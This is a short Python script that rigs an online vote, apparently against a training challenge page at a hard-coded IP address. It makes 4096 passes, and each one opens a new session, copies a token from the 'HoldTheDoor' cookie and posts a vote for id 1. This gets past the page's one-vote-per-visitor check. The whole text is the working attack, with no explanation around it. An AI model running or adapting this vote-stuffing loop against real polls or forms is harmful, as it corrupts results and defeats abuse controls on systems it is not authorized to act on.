import requests

URL = 'http://158.69.76.135/level1.php'
times = 4096
votes = 0

for i in range(0, times):
    try:
        with requests.Session() as s:
            # get the response object
            s.get(URL)

            # get key from cookies
            key = s.cookies['HoldTheDoor']

            # compose the data that will send
            payload = {
                'id': '1',
                'key': key,
                'holdthedoor': 'submit'
            }

            # send the data
            s.post(URL, data=payload)
    except Exception as err:
        print(err)